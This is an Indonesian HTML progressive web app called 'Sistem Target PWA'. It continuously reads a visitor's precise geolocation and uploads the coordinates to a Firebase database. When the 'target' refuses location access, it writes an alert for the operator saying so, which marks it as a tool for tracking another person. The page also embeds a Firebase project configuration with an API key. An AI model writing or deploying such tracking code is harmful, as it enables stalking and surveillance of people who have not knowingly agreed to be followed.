<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Sistem Target PWA</title>
    <link rel="manifest" href="/manifest.json">
    <meta name="theme-color" content="#317EFB">
    <script type="module">
        import { initializeApp } from 'https://www.gstatic.com/firebasejs/9.16.0/firebase-app.js';
        import { getDatabase, ref, set, remove } from 'https://www.gstatic.com/firebasejs/9.16.0/firebase-database.js';

        const firebaseConfig = {
            apiKey: "AIzaSyDgPYGXqbBXt1NayhNB5M-8mjXfGKrOzWM",
            authDomain: "coba-accf3.firebaseapp.com",
            databaseURL: "https://coba-accf3-default-rtdb.asia-southeast1.firebasedatabase.app/",
            projectId: "coba-accf3",
            storageBucket: "coba-accf3.appspot.com",
            messagingSenderId: "171764982868",
            appId: "1:171764982868:web:19c716f6617667514679c1"
        };

        const app = initializeApp(firebaseConfig);
        const database = getDatabase(app);

        function getLocation() {
            if (navigator.geolocation) {
                navigator.geolocation.watchPosition(showPosition, showError, { enableHighAccuracy: true });
            } else {
                alert("Geolocation is not supported by this browser.");
            }
        }

        function showPosition(position) {
            const lat = position.coords.latitude;
            const lon = position.coords.longitude;
            const locationRef = ref(database, 'devices/device1');
            set(locationRef, { latitude: lat, longitude: lon, timestamp: Date.now() });
            remove(ref(database, 'notifications/device1'));
        }

        function showError(error) {
            const notificationRef = ref(database, 'notifications/device1');
            switch (error.code) {
                case error.PERMISSION_DENIED:
                    set(notificationRef, { message: "Target tidak izinkan lokasi" });
                    break;
                case error.POSITION_UNAVAILABLE:
                    alert("Location information is unavailable.");
                    break;
                case error.TIMEOUT:
                    alert("The request to get user location timed out.");
                    break;
                case error.UNKNOWN_ERROR:
                    alert("An unknown error occurred.");
                    break;
            }
        }

        window.onload = () => {
            getLocation();
            // Register service worker for PWA
            if ('serviceWorker' in navigator) {
                navigator.serviceWorker.register('/service-worker.js')
                    .then((reg) => console.log('Service Worker registered', reg))
                    .catch((err) => console.error('Service Worker registration failed', err));
            }
        };
    </script>
</head>
<body>
    <h1>Sistem Target PWA</h1>
    <p>Memantau lokasi perangkat...</p>
</body>
</html>
